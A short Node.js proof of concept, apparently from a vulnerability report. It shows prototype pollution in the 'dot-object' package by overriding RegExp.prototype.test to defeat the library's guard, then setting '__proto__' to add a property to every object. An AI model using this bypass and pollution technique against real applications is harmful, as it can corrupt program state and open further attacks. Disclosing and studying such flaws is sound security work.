RegExp.prototype.test = () => false;
var a = require('dot-object');
var obj = {};
var path = '__proto__';
console.log({}.polluted);
var val = { polluted: 'yes' };
a.set(path, val, {}, true);
console.log({}.polluted);